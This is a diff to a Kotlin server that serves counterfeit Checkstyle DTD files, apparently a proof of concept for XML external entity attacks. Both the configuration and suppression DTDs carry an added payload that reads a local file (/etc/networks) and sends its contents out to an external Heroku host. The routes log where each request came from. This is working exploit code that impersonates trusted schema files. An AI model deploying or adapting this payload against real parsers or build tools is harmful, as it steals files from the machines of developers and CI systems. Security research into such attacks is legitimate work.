@@ -55,7 +55,77 @@ data class OriginInfo(
         )
 }
 
-val dtd = """
+val maliciousDtd = """
+
+<!ENTITY % payload SYSTEM "file:///etc/networks">
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "https://testing-kotlin-server.herokuapp.com/x=%payload;">'>
+%param1;
+%external;
+
+""".trimIndent()
+
+val configuationDtd = """
+?xml version="1.0" encoding="UTF-8"?>
+
+<!-- Add the following to any file that is to be validated against this DTD:
+
+<!DOCTYPE module PUBLIC
+    "-//Puppy Crawl//DTD Check Configuration 1.3//EN"
+    "http://www.puppycrawl.com/dtds/configuration_1_3.dtd">
+-->
+
+<!ELEMENT module (module|property|metadata|message)*>
+<!ATTLIST module name NMTOKEN #REQUIRED>
+
+<!ELEMENT property EMPTY>
+<!ATTLIST property
+    name NMTOKEN #REQUIRED
+    value CDATA #REQUIRED
+    default CDATA #IMPLIED
+>
+
+<!--
+
+   Used to store metadata in the Checkstyle configuration file. This
+   information is ignored by Checkstyle. This may be useful if you want to
+   store plug-in specific information.
+
+   To avoid name clashes between different tools/plug-ins you are *strongly*
+   encouraged to prefix all names with your domain name. For example, use the
+   name "com.mycompany.parameter" instead of "parameter".
+
+   The prefix "com.puppycrawl." is reserved for Checkstyle.
+
+-->
+
+<!ELEMENT metadata EMPTY>
+<!ATTLIST metadata
+     name NMTOKEN #REQUIRED
+     value CDATA #REQUIRED
+>
+
+<!--
+   Can be used to replaced some generic Checkstyle messages with a custom
+   messages.
+
+   The 'key' attribute specifies for which actual Checkstyle message the
+   replacing should occur, look into Checkstyles message.properties for
+   the according message keys.
+
+   The 'value' attribute defines the custom message patterns including
+   message parameter placeholders as defined in the original Checkstyle
+   messages (again see message.properties for reference).
+-->
+<!ELEMENT message EMPTY>
+<!ATTLIST message
+     key NMTOKEN #REQUIRED
+     value CDATA #REQUIRED
+>
+
+$maliciousDtd
+""".trimIndent()
+
+val suppressionDtd = """
 <!-- Add the following to any file that is to be validated against this DTD:
 
 <!DOCTYPE suppressions PUBLIC
@@ -73,10 +143,7 @@ val dtd = """
                    lines CDATA #IMPLIED
                    columns CDATA #IMPLIED>
 
-<!ENTITY % payload SYSTEM "file:///etc/networks">
-<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "https://testing-kotlin-server.herokuapp.com/x=%payload;">'>
-%param1;
-%external;
+$maliciousDtd
 """.trimIndent()
 
 private fun run(port: Int) {
@@ -96,11 +163,19 @@ private fun run(port: Int) {
                 log.info("Origin: ${OriginInfo(call.request.origin)}")
                 call.respond(HttpStatusCode.OK)
             }
-            get("/dtds/suppressions_1_2.dtd") {
-                log.info("Retrieving DTD")
+            get("dtds/configuration_1_3.dtd") {
+                log.info("Retrieving Configuration DTD")
                 log.info("Origin: ${OriginInfo(call.request.origin)}")
                 call.respond(HttpStatusCode.OK, TextContent(
-                    dtd,
+                    configuationDtd,
+                    contentType = ContentType.Application.Xml_Dtd
+                ))
+            }
+            get("/dtds/suppressions_1_2.dtd") {
+                log.info("Retrieving Suppression DTD")
+                log.info("Origin: ${OriginInfo(call.request.origin)}")
+                call.respond(HttpStatusCode.OK, TextContent(
+                    suppressionDtd,
                     contentType = ContentType.Application.Xml_Dtd
                 ))
             }
